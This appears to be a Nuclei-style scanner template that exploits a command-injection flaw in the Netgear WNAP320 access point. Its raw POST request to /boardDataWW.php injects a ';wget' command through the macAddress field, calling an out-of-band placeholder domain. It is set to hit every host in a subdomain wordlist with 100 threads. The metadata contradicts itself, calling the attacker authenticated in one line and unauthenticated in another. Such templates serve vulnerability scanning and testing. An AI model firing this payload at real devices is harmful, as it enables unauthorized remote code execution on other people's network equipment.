id: netgear-wnap320-rce
info:
  author: gy741
  description: vulnerabilities in the web-based management interface of Netgear WNAP320
    Access Point could allow an authenticated, remote attacker to perform command
    injection attacks against an affected device.
  name: Netgear WNAP320 Access Point - Remote Code Execution (Unauthenticated)
  reference: '- https://github.com/nobodyatall648/Netgear-WNAP320-Firmware-Version-2.0.3-RCE

    '
  severity: critical
  tags: netgear,rce,oob,router
requests:
- attack: sniper
  payloads:
    Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
  raw:
  - 'POST /boardDataWW.php HTTP/1.1

    Host: {{Subdomains}}

    User-Agent: python-requests/2.18.4

    Accept-Encoding: gzip, deflate

    Accept: */*

    Connection: keep-alive

    Content-Type: application/x-www-form-urlencoded


    macAddress=112233445566%3Bwget+http%3A%2F%2F{{Host}}.{{Port}}.{{Subdomains}}.netgear.{{MY-DOMAIN}}%23&reginfo=0&writeData=Submit

    '
  threads: 100
